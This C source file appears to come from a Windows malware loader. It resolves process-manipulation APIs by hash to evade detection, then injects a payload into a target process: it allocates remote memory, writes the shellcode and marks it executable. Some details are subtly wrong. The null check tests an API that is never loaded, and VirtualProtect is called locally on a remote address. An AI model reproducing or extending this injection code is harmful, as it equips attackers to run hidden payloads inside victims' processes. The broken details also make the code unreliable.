#include "../../../includes/memory/memory.h"
#include "../../../includes/apis/apis.h"
#include "../../../includes/core/core.h"







BOOL memory_load_apis() {
	g_ldr->apis->OpenProcess = (pOpenProcess)GetProc(g_ldr->apis->modules.kernel32, HASHED_OPENPROCESS);
	g_ldr->apis->VirtualAllocEx = (pVirtualAllocEx)GetProc(g_ldr->apis->modules.kernel32, HASHED_VIRTUALALLOCEX);
	g_ldr->apis->WriteProcessMemory = (pWriteProcessMemory)GetProc(g_ldr->apis->modules.kernel32, HASHED_WRITEPROCESSMEMORY);
	g_ldr->apis->VirtualProtect = (pVirtualProtect)GetProc(g_ldr->apis->modules.kernel32, HASHED_VIRTUALPROTECT);

	if (g_ldr->apis->WriteProcessMemory == NULL || g_ldr->apis->VirtualAlloc == NULL) {
		return FALSE;
	}

	return TRUE;
}


MemoryInfo memory_run(LPVOID PayloadAddress, SIZE_T PayloadSize) {
	MemoryInfo memInfo = { 0 };

	HANDLE hProc = resolve_target_process();
	LPVOID addr = g_ldr->apis->VirtualAllocEx(hProc, NULL, PayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!addr) {
		DBGA("[!] Failed Allocating Remote Memory | %lu\n", GetLastError());
		memInfo.ok = FALSE;
		memInfo.BytesWrote = 0;
		return memInfo;
	}
	DWORD BytesWrote = 0;
	if (!g_ldr->apis->WriteProcessMemory(hProc, addr, PayloadAddress, PayloadSize, &BytesWrote)) {
		DBGA("[!] Failed Writing Remote Memory | %lu\n", GetLastError());
		memInfo.ok = FALSE;
		memInfo.BytesWrote = 0;
		return memInfo;
	}
	DWORD old = 0;
	BOOL check = g_ldr->apis->VirtualProtect(addr, PayloadSize, PAGE_EXECUTE_READ, &old);
	if (!check) {
		DBGA("[!] VirtualProtect Failed | %d\n", GetLastError());
		memInfo.ok = FALSE;
		memInfo.BytesWrote = 0;
		return memInfo;
	}

	memInfo.ShellCodeAddress = addr;
	memInfo.BytesWrote = BytesWrote;
	memInfo.ok = TRUE;
	memInfo.remoteProcess = hProc;


	return memInfo;

}


